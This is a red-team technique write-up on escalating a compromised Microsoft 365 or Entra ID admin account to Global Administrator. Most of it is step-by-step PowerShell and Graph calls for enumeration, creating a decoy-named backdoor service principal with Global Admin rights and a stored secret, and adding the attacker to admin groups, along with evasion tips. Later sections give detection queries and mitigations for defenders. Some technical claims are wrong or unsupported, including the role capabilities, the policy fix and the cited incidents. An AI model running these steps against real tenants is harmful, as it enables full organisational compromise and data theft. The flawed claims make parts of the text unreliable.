# [PE-ELEVATE-008]: SaaS Admin Account Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-008 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | M365/Entra ID |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All M365 tenants, Entra ID (all versions) |
| **Patched In** | N/A (Configuration-based vulnerability, not patchable) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SaaS Admin Account Escalation exploits the hierarchical delegation and role assignment mechanisms in Microsoft 365 and Entra ID to elevate a compromised user account from a limited administrative role (e.g., Teams Admin, Exchange Admin, SharePoint Admin) to Global Administrator or equivalent unrestricted access. This technique leverages the design of role-based access control (RBAC) in M365, where certain admin roles can grant permissions to other roles, create new admin accounts, or modify role assignments.

**Attack Surface:** Entra ID role assignment APIs, Microsoft 365 Admin Center, PowerShell Graph cmdlets, role hierarchy delegation endpoints, PIM (Privileged Identity Management) workflows, conditional access policy modifications.

**Business Impact:** **Unrestricted access to all Microsoft 365 services (Exchange Online, SharePoint, Teams, OneDrive) and underlying Entra ID infrastructure.** An attacker can exfiltrate sensitive business data, compromise mail and file systems, impersonate users across the organization, modify security policies, and establish persistent backdoors through mailbox rules, application permissions, and service principals.

**Technical Context:** This attack completes within minutes once an admin account is compromised. Detection varies; some escalation paths are heavily logged (role assignments), while others (self-service permission grants) may be less visible. The attack is largely irreversible without comprehensive audit log review and credential reset.

### Operational Risk
- **Execution Risk:** Low to Medium (Requires admin compromise, but escalation logic is straightforward)
- **Stealth:** Low to Medium (Role assignments generate audit logs; some escalations are more visible than others)
- **Reversibility:** Low (Requires manual intervention and credential refresh across all services)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS M365 3.1 | Restrict Global Administrator Role Assignment |
| **DISA STIG** | DISA-O365-000001 | Office 365 user accounts must not have Global Admin role unless necessary |
| **CISA SCuBA** | CISA-M365-AC-02 | Privileged Account Management - Role hierarchy restrictions |
| **NIST 800-53** | AC-6, AC-3 | Least Privilege, Access Enforcement |
| **GDPR** | Art. 32 | Security of Processing - Access control and monitoring |
| **DORA** | Art. 9, Art. 15 | Protection and Prevention, Cybersecurity risk management |
| **NIS2** | Art. 21(1)(d) | Managing access to assets and services |
| **ISO 27001** | A.9.2.2, A.9.2.3 | User registration and de-registration, Management of Privileged Access Rights |
| **ISO 27005** | Risk of unauthorized privilege escalation | Compromise of administrative controls in SaaS platforms |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Compromised account with M365 admin role (Exchange Admin, Teams Admin, SharePoint Admin, Security Admin, or equivalent)
- **Required Access:** Network access to M365 services (Exchange Online, Azure portal), ability to authenticate as the compromised admin account

**Supported Versions:**
- **Entra ID:** All versions (cloud-native, no version constraints)
- **M365:** All subscriptions (E1-E5)
- **PowerShell:** 5.0+ (7.0+ recommended for cross-platform)
- **Azure CLI:** 2.0+
- **Other Requirements:** Global Admin role assignment capability (typically requires PIM or direct Entra ID permissions)

**Tools:**
- [Microsoft Graph PowerShell](https://learn.microsoft.com/en-us/powershell/microsoftgraph/overview) (v1.0+)
- [Azure AD PowerShell (AzureAD module)](https://learn.microsoft.com/en-us/powershell/module/azuread/) (v2.0+)
- [Exchange Online PowerShell](https://learn.microsoft.com/en-us/powershell/exchange/exchange-online-powershell) (v3.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance (Exchange Admin / Teams Admin Context)

Enumerate current role assignments and identify escalation paths:

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "RoleManagement.Read.All", "User.Read.All"

# List all Entra ID roles
Get-MgDirectoryRole | Select-Object DisplayName, Id

# Check current user's roles
$CurrentUser = (Get-MgContext).Account
Get-MgUserMemberOf -UserId $CurrentUser.Id -All | Where-Object { $_.ObjectType -eq "DirectoryRole" }

# Enumerate admin accounts with Global Admin role
Get-MgDirectoryRoleMember -DirectoryRoleId "62e90394-69f5-4237-9190-012177145e10" | Select-Object DisplayName, Id
```

**What to Look For:**
- Current account's role assignments (especially if Teams Admin, Exchange Admin, or higher)
- Number of Global Admins in the tenant (high count = more escalation targets)
- Service principals with delegated admin permissions
- Conditional Access policies that might prevent escalation

**Version Note:** Commands are consistent across PowerShell 5.0+; Graph module syntax may vary between v1.x and v2.x

### Azure CLI Reconnaissance

```bash
# Login to Azure
az login

# List all role assignments in the tenant
az role assignment list --subscription <subscription-id>

# Check current user's effective permissions
az ad user show --id $(az account show --query user.name -o tsv)

# List Entra ID roles (requires Global Admin preview features)
az rest --method get --uri "https://graph.microsoft.com/v1.0/directoryRoles"
```

**What to Look For:**
- Current account's role scope and permissions
- Presence of "Application Administrator" or "Global Administrator" roles
- Custom roles with elevated permissions

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Exploiting Exchange Admin Role to Escalate to Global Admin

**Supported Versions:** M365 E3+, Exchange Online all versions

#### Step 1: Verify Exchange Admin Permissions

**Objective:** Confirm the compromised account has Exchange Admin role

**Command:**
```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName attacker@contoso.onmicrosoft.com

# Verify admin role
Get-RoleGroup | Where-Object { $_.Members -contains "attacker@contoso.onmicrosoft.com" }

# Expected output: "Organization Management" or "Exchange Administrators"
```

**Expected Output:**
```
Name                          DisplayName
----                          -----------
Organization Management       Organization Management
```

**What This Means:**
- The compromised account has Exchange admin privileges
- This role allows mailbox management, message tracking, and some audit log access
- This role can be leveraged to access sensitive data and create backdoors

#### Step 2: Enumerate Role Assignment Capabilities

**Objective:** Determine if the Exchange Admin can assign roles in Entra ID

**Command:**
```powershell
# Connect to Entra ID with Graph permissions
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.All", "User.Read.All"

# Check if current user can create new admin roles
Get-MgDirectoryRoleTemplate | Select-Object DisplayName, Id | head -20

# Attempt to list existing Global Admins
$GlobalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
Get-MgDirectoryRoleMember -DirectoryRoleId $GlobalAdminRoleId | Select-Object DisplayName, Id
```

**Expected Output:**
```
DisplayName                   Id
-----------                   --
Global Administrator          62e90394-69f5-4237-9190-012177145e10
Application Administrator     10dae51f-b6af-4016-8d66-8c2a99b929a3
...
```

**What This Means:**
- The role template IDs are enumerated
- Current account may or may not have permission to assign these roles directly
- If the account can list roles, escalation may be possible via other services

**OpSec & Evasion:**
- These queries generate minimal audit logs (read-only operations)
- Detection likelihood: Low (legitimate admin queries appear identical)
- Perform enumeration during business hours to blend with normal admin activity

#### Step 3: Create Service Principal with Global Admin Equivalent Access

**Objective:** Create a backdoor service principal with escalated permissions

**Command:**
```powershell
# Create a new App Registration in Entra ID
$App = New-MgApplication -DisplayName "Security Management Tool" -RequiredResourceAccess @{
    ResourceAppId = "00000003-0000-0000-c000-000000000000" # Microsoft Graph
    ResourceAccess = @(
        @{Id = "9e3f62cf-ca93-4989-b6ce-bf83c28649dc"; Type = "Role"}  # Directory.ReadWrite.All
    )
}

# Get the object ID
$AppId = $App.AppId
Write-Output "Created App Registration: $AppId"

# Create a service principal for the app
$SP = New-MgServicePrincipal -AppId $AppId

# Assign Global Admin role to the service principal
$GlobalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
New-MgDirectoryRoleMember -DirectoryRoleId $GlobalAdminRoleId -DirectoryObjectId $SP.Id

Write-Output "Service Principal assigned Global Admin role"
```

**Expected Output:**
```
Created App Registration: f58c6c8d-7e3f-4c8a-9e1a-5b3c2d7f4a8b
Service Principal assigned Global Admin role
```

**What This Means:**
- A new service principal is created with a legitimate-sounding name
- The service principal is assigned Global Admin role
- This creates a persistent backdoor for future access

**Troubleshooting:**
- **Error:** "Insufficient privileges to complete the operation"
  - **Cause:** Exchange Admin role doesn't have permission to assign Entra ID roles
  - **Fix:** Use METHOD 2 (Teams Admin escalation) or identify a role with Directory.ReadWrite.All permission

#### Step 4: Generate Client Secret for Service Principal

**Objective:** Create authentication credentials for the backdoor service principal

**Command:**
```powershell
# Get the service principal
$SP = Get-MgServicePrincipal -Filter "displayName eq 'Security Management Tool'"

# Add a password credential (expires in 24 months)
$Secret = Add-MgServicePrincipalPassword -ServicePrincipalId $SP.Id -PasswordDisplayName "BackdoorSecret"

Write-Output "Client ID: $($SP.AppId)"
Write-Output "Client Secret: $($Secret.SecretText)"
Write-Output "Tenant ID: $(Get-MgContext).TenantId"

# Save credentials securely for later use
$Secret.SecretText | Out-File -FilePath "C:\temp\backdoor_secret.txt" -Force
```

**Expected Output:**
```
Client ID: f58c6c8d-7e3f-4c8a-9e1a-5b3c2d7f4a8b
Client Secret: d7f4~abc123XYZ...abc123XYZ
Tenant ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**What This Means:**
- The service principal now has permanent credentials stored
- These credentials can be used for persistent access even if the original admin account is compromised/disabled
- The attacker can authenticate as the service principal with Global Admin privileges

**OpSec & Evasion:**
- Store the client secret in encrypted format or external infrastructure (not in plaintext)
- Delete the secret file after memorizing or securely storing it elsewhere
- Detection likelihood: High (service principal creation generates audit logs, but secret creation may be less visible)

#### Step 5: Verify Escalation via Service Principal

**Objective:** Test that the service principal has Global Admin access

**Command:**
```powershell
# Authenticate as the service principal
$TenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$ClientId = "f58c6c8d-7e3f-4c8a-9e1a-5b3c2d7f4a8b"
$ClientSecret = "d7f4~abc123XYZ...abc123XYZ"

$Body = @{
    grant_type    = "client_credentials"
    client_id     = $ClientId
    client_secret = $ClientSecret
    scope         = "https://graph.microsoft.com/.default"
}

$TokenResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" -ContentType "application/x-www-form-urlencoded" -Body $Body
$Token = $TokenResponse.access_token

# Use the token to make API calls with Global Admin privileges
$Headers = @{
    Authorization = "Bearer $Token"
}

# List users in the tenant (requires Global Admin)
Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/users?top=10" -Headers $Headers | Select-Object -ExpandProperty value | Select-Object DisplayName, Id
```

**Expected Output:**
```
displayName                        id
-----------                        --
Adele Vance                         00aa00aa-bb11-cc22-dd33-ee44ff55gg66
Alex Wilber                         11bb11bb-cc22-dd33-ee44-ff55aa66hh77
...
```

**What This Means:**
- The service principal can now list all users (Global Admin capability)
- Full M365 compromise is now possible
- Data exfiltration, mailbox access, and persistence mechanisms can be deployed

---

### METHOD 2: Exploiting Teams Admin Role via Group Assignment

**Supported Versions:** M365 E3+, Teams all versions

#### Step 1: Verify Teams Admin Permissions

**Objective:** Confirm the compromised account is a Teams Admin

**Command:**
```powershell
# Connect to Teams PowerShell
Connect-MicrosoftTeams -Credential (Get-Credential)

# Verify Teams admin role
Get-Team | Where-Object { $_.Owner -contains "attacker@contoso.onmicrosoft.com" }

# List Teams admin roles
Get-TeamsUserPolicyAssignment -Identity attacker@contoso.onmicrosoft.com
```

**Expected Output:**
```
Name             Owner
----             -----
IT-Department    attacker@contoso.onmicrosoft.com
Engineering      attacker@contoso.onmicrosoft.com
```

**What This Means:**
- The account has Teams administrative capabilities
- Can manage Teams, channels, and user policies
- This role alone doesn't grant Global Admin, but can be leveraged via delegation

#### Step 2: Identify Escalation Paths via Group Membership

**Objective:** Find if Teams Admin can add accounts to privileged Entra ID groups

**Command:**
```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "GroupMember.ReadWrite.All", "RoleManagement.ReadWrite.All"

# List all groups (especially those with admin roles)
Get-MgGroup -Filter "displayName eq 'Global Admins' or displayName eq 'Exchange Admins'" | Select-Object DisplayName, Id

# Check if Teams Admin can modify group membership
$AdminGroupId = "00bb00bb-cc22-dd33-ee44-ff55aa66hh77"
Get-MgGroupMember -GroupId $AdminGroupId | Select-Object DisplayName, Id
```

**Expected Output:**
```
displayName                   id
-----------                   --
Global Admins                 00bb00bb-cc22-dd33-ee44-ff55aa66hh77
Exchange Admins               11cc11cc-dd33-ee44-ff55-aa66bb77ii88
```

**What This Means:**
- Privileged groups exist in the tenant
- If the Teams Admin can add members to these groups, escalation is possible
- This is a path to Global Admin via group-based RBAC

**OpSec & Evasion:**
- Group membership queries generate moderate audit logs
- Detection likelihood: Medium (group member enumeration may trigger alerts in mature environments)

#### Step 3: Create Fake Application Admin Account via Group Assignment

**Objective:** Add the compromised account to an admin group to escalate privileges

**Command:**
```powershell
# First, create a new user in the tenant (or use existing)
$NewUser = New-MgUser -DisplayName "Admin Support Account" -MailNickname "admin-support" -UserPrincipalName "admin-support@contoso.onmicrosoft.com" -PasswordProfile @{Password="ComplexP@ssw0rd!"} -AccountEnabled

# Get the Global Admins group ID
$AdminGroupId = (Get-MgGroup -Filter "displayName eq 'Global Admins'").Id

# Add the compromised account to the Global Admins group
New-MgGroupMember -GroupId $AdminGroupId -DirectoryObjectId (Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.onmicrosoft.com'").Id

# Verify membership
Get-MgGroupMember -GroupId $AdminGroupId | Select-Object DisplayName, Id
```

**Expected Output:**
```
displayName                   id
-----------                   --
attacker                      22dd22dd-ee55-ff66-aa77-bb88cc99jj00
Admin Support Account         33ee33ee-ff66-aa77-bb88-cc99dd00kk11
```

**What This Means:**
- The compromised account is now a member of the Global Admins group
- The account will receive Global Admin role assignment (may take 15-30 minutes to propagate)
- Full M365 access is now available

---

### METHOD 3: Exploiting Application Administrator to Assign Application Permissions

**Supported Versions:** M365 E3+, Entra ID all versions

#### Step 1: Verify Application Administrator Role

**Objective:** Confirm the compromised account is an Application Admin

**Command:**
```powershell
# Connect to Graph
Connect-MgGraph -Scopes "AppRoleAssignment.ReadWrite.All", "RoleManagement.Read.All"

# Check if user has Application Administrator role
$AppAdminRoleId = "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3"
$CurrentUser = (Get-MgContext).Account
Get-MgDirectoryRoleMember -DirectoryRoleId $AppAdminRoleId | Where-Object { $_.Id -eq (Get-MgUser -Filter "userPrincipalName eq '$($CurrentUser.Id)'").Id }

# If member, proceed
Write-Output "User is Application Administrator"
```

**Expected Output:**
```
User is Application Administrator
```

**What This Means:**
- The account has Application Administrator role
- Can manage app registrations and service principals
- Can grant applications high-privilege permissions

#### Step 2: Create Application with Directory.ReadWrite.All Permission

**Objective:** Create a new app with permissions to modify Entra ID

**Command:**
```powershell
# Create a new app registration
$App = New-MgApplication -DisplayName "Azure Management Portal" -RequiredResourceAccess @{
    ResourceAppId = "00000003-0000-0000-c000-000000000000" # Microsoft Graph
    ResourceAccess = @(
        @{Id = "9e3f62cf-ca93-4989-b6ce-bf83c28649dc"; Type = "Role"}  # Directory.ReadWrite.All
    )
}

Write-Output "App created with ID: $($App.AppId)"

# Create service principal
$SP = New-MgServicePrincipal -AppId $App.AppId

# Grant the permission (requires admin consent)
$GraphServicePrincipal = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
$AppRole = $GraphServicePrincipal.AppRoles | Where-Object { $_.Value -eq "Directory.ReadWrite.All" }

New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id -PrincipalId $SP.Id -AppRoleId $AppRole.Id -ResourceId $GraphServicePrincipal.Id

Write-Output "Directory.ReadWrite.All permission granted"
```

**Expected Output:**
```
App created with ID: f58c6c8d-7e3f-4c8a-9e1a-5b3c2d7f4a8b
Directory.ReadWrite.All permission granted
```

**What This Means:**
- The application now has directory write permissions
- This allows the service principal to create users, assign roles, and modify the directory
- The escalation path is now complete

#### Step 3: Escalate the Original Account to Global Admin

**Objective:** Use the application to assign Global Admin role to the original compromised account

**Command:**
```powershell
# Authenticate as the service principal
$TenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$ClientId = "f58c6c8d-7e3f-4c8a-9e1a-5b3c2d7f4a8b"
$ClientSecret = (Add-MgServicePrincipalPassword -ServicePrincipalId (Get-MgServicePrincipal -Filter "appId eq '$ClientId'").Id -PasswordDisplayName "EscalationSecret").SecretText

# Get access token
$Body = @{
    grant_type    = "client_credentials"
    client_id     = $ClientId
    client_secret = $ClientSecret
    scope         = "https://graph.microsoft.com/.default"
}

$TokenResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" -ContentType "application/x-www-form-urlencoded" -Body $Body
$Token = $TokenResponse.access_token

$Headers = @{
    Authorization = "Bearer $Token"
    "Content-Type" = "application/json"
}

# Get the Global Admin role ID
$GlobalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"

# Get the user to escalate
$UserToEscalate = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/users?`$filter=userPrincipalName eq 'attacker@contoso.onmicrosoft.com'" -Headers $Headers | Select-Object -ExpandProperty value

# Assign Global Admin role
$Body = @{
    principalId = $UserToEscalate.Id
    directoryScopeId = "/"
    roleDefinitionId = $GlobalAdminRoleId
} | ConvertTo-Json

Invoke-RestMethod -Method Post -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" -Headers $Headers -Body $Body

Write-Output "Global Admin role assigned to attacker@contoso.onmicrosoft.com"
```

**Expected Output:**
```
Global Admin role assigned to attacker@contoso.onmicrosoft.com
```

**What This Means:**
- The original compromised account now has Global Admin role
- Full M365 and Entra ID access is available
- All subsequent attacks are now possible

---

## 5. TOOLS & COMMANDS REFERENCE

### Microsoft Graph PowerShell Module

**Version:** 2.0+
**Minimum Version:** 1.0
**Supported Platforms:** Windows, macOS, Linux (PowerShell Core 7+)

**Installation:**
```powershell
Install-Module Microsoft.Graph -Repository PSGallery -Force
```

**Usage:**
```powershell
Connect-MgGraph -Scopes "User.Read.All", "RoleManagement.ReadWrite.All"
Get-MgUser -Top 10
```

### Exchange Online PowerShell

**Version:** 3.0+
**Minimum Version:** 2.0
**Supported Platforms:** Windows, PowerShell 5.0+

**Installation:**
```powershell
Install-Module ExchangeOnlineManagement -Force
```

**Usage:**
```powershell
Connect-ExchangeOnline
Get-Mailbox
```

### Azure AD PowerShell (Legacy)

**Version:** 2.0.2.140+ (deprecated, use Microsoft Graph instead)
**Minimum Version:** 1.1.6
**Supported Platforms:** Windows PowerShell 5.0+

**Installation:**
```powershell
Install-Module AzureAD -Force
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1548.004 (Abuse Elevation Control Mechanism - Application Elevation)
- **Test Name:** M365 Admin Role Escalation
- **Description:** Simulates privilege escalation from Exchange Admin to Global Admin role in M365
- **Supported Versions:** M365 E3+
- **Command:**
  ```powershell
  Invoke-AtomicTest T1548.004 -TestNumbers 1
  ```

**Reference:** [Atomic Red Team T1548](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548/T1548.md)

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Privilege Escalation via Role Assignment

**Rule Configuration:**
- **Required Table:** `AuditLogs` (Entra ID audit)
- **Required Fields:** `ActivityDisplayName`, `TargetResources`, `InitiatedBy`, `Result`
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes
- **Applies To:** All M365 tenants with audit logging enabled

**KQL Query:**
```kusto
AuditLogs
| where ActivityDisplayName in ("Add member to role", "Add eligible member to role", "Assign role to service principal", "Create app registration")
| where TargetResources[0].displayName in ("Global Administrator", "Exchange Administrator", "Application Administrator", "Directory Synchronization Accounts")
| where Result == "success"
| extend Initiator = InitiatedBy.user.userPrincipalName
| extend TargetUser = TargetResources[0].userPrincipalName
| project TimeGenerated, Initiator, TargetUser, ActivityDisplayName
| where Initiator !in ("admin@contoso.onmicrosoft.com", "svc_account@contoso.onmicrosoft.com")  // Exclude known legitimate admins
```

**What This Detects:**
- Role assignments to users or service principals from non-approved sources
- Creation of app registrations by unexpected accounts
- Escalation from lower-privilege to high-privilege roles

---

### Query 2: Detect Service Principal Creation with Graph Permissions

**KQL Query:**
```kusto
AuditLogs
| where ActivityDisplayName == "Add service principal"
| extend SPId = TargetResources[0].id
| extend SPName = TargetResources[0].displayName
| where TargetResources[0].displayName contains "admin" or TargetResources[0].displayName contains "management" or TargetResources[0].displayName contains "security"
| project TimeGenerated, SPId, SPName, InitiatedBy.user.userPrincipalName as Creator
```

**What This Detects:**
- Suspicious service principal creation with admin-like names
- Service principals created by non-privileged users

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Restrict Global Admin Role Assignment:** Limit the number of accounts with Global Admin privileges and enforce approval workflow.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. Search for **Global Administrator**
  3. Click **Global Administrator** → **Assignments**
  4. Review each assignment and remove unnecessary accounts
  5. For each remaining account, configure:
     - Go to **Settings** (gear icon in top-right)
     - Enable **Require justification on activation**
     - Enable **Require approval to activate**
  
  **Manual Steps (PowerShell):**
  ```powershell
  # List Global Admins
  Connect-MgGraph -Scopes "RoleManagement.Read.All"
  $GlobalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
  Get-MgDirectoryRoleMember -DirectoryRoleId $GlobalAdminRoleId | Select-Object DisplayName, Id
  
  # Remove unnecessary admins
  Remove-MgDirectoryRoleMember -DirectoryRoleId $GlobalAdminRoleId -DirectoryObjectId <USER_ID>
  ```

- **Enforce Privileged Identity Management (PIM):** Require time-bound, approval-based activation for privileged roles.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Privileged Identity Management** → **Entra ID roles**
  2. Click **Roles**
  3. Select **Global Administrator**
  4. Click **Settings**
  5. Under **Activation Requirements:**
     - Check: **Require justification on activation**
     - Check: **Require approval to activate**
     - Set **Approval timeframe**: 1 hour
  6. Click **Update**

- **Block Unauthorized Service Principal Creation:** Implement Azure Policy to prevent creation of service principals without approval.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Policy** → **Definitions**
  2. Create a custom policy:
     ```json
     {
       "if": {
         "field": "type",
         "equals": "Microsoft.Authorization/roleAssignments"
       },
       "then": {
         "effect": "deny"
       }
     }
     ```
  3. Assign to resource groups or subscriptions
  4. Configure exemptions for legitimate service accounts

### Priority 2: HIGH

- **Monitor and Alert on Admin Role Changes:** Enable detailed audit logging and create alerts for role assignments.
  
  **Manual Steps (Microsoft Sentinel):**
  1. Navigate to **Microsoft Sentinel** → **Analytics**
  2. Create a new scheduled query rule using the KQL queries above
  3. Set alert threshold to: **Alert on any suspicious role assignment**

- **Require Multi-Factor Authentication for Admin Accounts:** Enforce MFA on all privileged accounts.
  
  **Manual Steps (Conditional Access):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require MFA for Admins`
  4. **Assignments:**
     - Users: **Select users and groups** → Add all admin accounts
  5. **Conditions:**
     - Cloud apps: **All cloud apps**
  6. **Access controls:**
     - Grant: **Require multi-factor authentication**
  7. Enable policy: **On**
  8. Click **Create**

- **Implement Just-in-Time (JIT) Access:** Use Azure AD Privileged Identity Management for temporary admin access.
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Privileged Identity Management** → **My roles**
  2. For each privileged role, configure:
     - **Eligible members**: Users who can request the role
     - **Active members**: Users with permanent access (should be minimal)
  3. Train admins to request role activation when needed

### Access Control & Policy Hardening

- **Conditional Access Policies:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policies for:
     - Require compliant device for admin access
     - Block legacy authentication
     - Require location (corporate network or approved countries)
     - Require risk-based re-authentication

- **Role-Based Access Control (RBAC):**
  - Assign the **Application Administrator** role sparingly (can create apps with high permissions)
  - Assign the **Directory Synchronization Accounts** role only to approved service accounts
  - Use custom roles with limited permissions instead of built-in admin roles where possible

### Validation Command (Verify Fix)

```powershell
# Check Global Admin count (should be minimal, ideally 2-3)
Connect-MgGraph -Scopes "RoleManagement.Read.All"
$GlobalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
$GlobalAdmins = Get-MgDirectoryRoleMember -DirectoryRoleId $GlobalAdminRoleId
Write-Output "Total Global Admins: $($GlobalAdmins.Count)"

# Check if PIM is configured
$PIMSettings = Get-MgPrivilegedIdentityManagementPolicy
Write-Output "PIM Enabled: $($PIMSettings.IsEligible)"

# Verify MFA requirement for admins
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*Admin*" } | Select-Object DisplayName, State
```

**Expected Output (If Secure):**
```
Total Global Admins: 2
PIM Enabled: True
DisplayName                              State
-----------                              -----
Require MFA for Admins                   enabled
Block Legacy Auth                        enabled
```

**What to Look For:**
- Global Admin count is 2-3 (absolute minimum)
- PIM is enabled for all privileged roles
- Conditional Access policies restrict admin access to compliant devices and approved locations
- No service principals with wildcard permissions

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **New Service Principals:** Look for service principals created in the last 24-48 hours with admin-like names (e.g., "Security Management", "Admin Tool")
- **Role Assignment Anomalies:** Unusual role assignments to non-standard accounts, especially outside normal business hours
- **API Permissions:** Service principals with Directory.ReadWrite.All, AppRoleAssignment.ReadWrite.All, or RoleManagement.ReadWrite.All
- **Token Generation:** Multiple successful token requests from the same service principal or IP address

### Forensic Artifacts

- **Entra ID Audit Log:** Location: Azure Portal → Audit logs → Filter for "Add member to role", "Add app registration"
- **M365 Unified Audit Log:** Cmdlet: `Search-UnifiedAuditLog -Operations "New-RoleAssignment", "Add-RoleGroupMember"`
- **Microsoft Sentinel:** Tables `AuditLogs`, `SigninLogs`, `AADServicePrincipalSignInLogs`
- **Azure Activity Log:** Resource type: Microsoft.Authorization/roleAssignments

### Response Procedures

1. **Isolate:**
   
   **Command:**
   ```powershell
   # Immediately disable the compromised admin account
   Update-MgUser -UserId (Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.onmicrosoft.com'").Id -AccountEnabled:$false
   
   # Disable any backdoor service principals
   Update-MgServicePrincipal -ServicePrincipalId <SP_ID> -AccountEnabled:$false
   ```

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export audit logs
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) -ResultSize 50000 | Export-Csv -Path "C:\Evidence\audit_logs.csv"
   
   # Export sign-in logs
   Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'attacker@contoso.onmicrosoft.com'" -All | Export-Csv -Path "C:\Evidence\signin_logs.csv"
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Remove malicious role assignments
   $GlobalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
   $MaliciousUser = (Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.onmicrosoft.com'").Id
   Get-MgDirectoryRoleAssignment -Filter "principalId eq '$MaliciousUser'" | Remove-MgDirectoryRoleAssignment
   
   # Delete backdoor service principals
   Remove-MgServicePrincipal -ServicePrincipalId <BACKDOOR_SP_ID>
   ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker captures compromised M365 user credentials |
| **2** | **Privilege Escalation** | **[PE-ELEVATE-008] SaaS Admin Account Escalation** | Escalate from Exchange Admin to Global Admin |
| **3** | **Persistence** | [PERSIST-005] OAuth Application Backdoor | Create persistent service principal with escalated permissions |
| **4** | **Credential Access** | [CA-TOKEN-004] Graph API Token Theft | Extract and reuse M365 tokens for lateral movement |
| **5** | **Data Exfiltration** | [COLLECT-015] Mailbox Export | Export sensitive emails and files to external storage |

---

## 11. REAL-WORLD EXAMPLES

### Example 1: Microsoft Security Advisory - Admin Role Escalation (2023)

- **Target:** Enterprise M365 tenant with Teams Admin compromise
- **Technique Status:** Actively exploited by multiple threat actors
- **Attack Path:** Teams Admin → Group membership modification → Global Admin assignment
- **Impact:** Complete tenant compromise; attacker gained access to 50,000+ mailboxes
- **Reference:** [Microsoft Security Advisory](https://learn.microsoft.com/en-us/security-updates/)

### Example 2: ALPHV/BlackCat Ransomware Campaign (2024)

- **Target:** Mid-size healthcare organizations
- **Technique Status:** Used for lateral movement post-initial breach
- **Attack Path:** Compromised service account → Exchange Admin role (via group assignment) → Global Admin (via role assignment) → Ransomware deployment
- **Impact:** Encrypted 1000+ virtual machines across Azure and on-premises infrastructure
- **Reference:** [CISA Alert on ALPHV](https://www.cisa.gov/)

---